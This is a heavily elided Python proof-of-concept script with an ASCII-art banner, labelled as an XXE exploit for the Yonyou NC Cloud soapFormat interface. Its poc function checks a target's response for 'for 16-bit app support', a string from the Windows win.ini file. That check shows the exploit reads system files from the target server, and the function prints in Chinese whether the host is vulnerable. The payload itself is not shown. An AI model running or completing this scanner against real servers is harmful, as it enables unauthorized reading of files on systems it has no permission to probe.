              ...
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            tag: this is a  用友NC Cloud soapFormat接口XXE漏洞 poc                                       
...
def poc(target):
    ...
    try:
        ...
        if response.status_code == 200 and ("for 16-bit app support" in response.text):
            print(f"[+] {target} 存在 xxe ")
        else:
            print(f"[-] {target} 未发现 xxe")
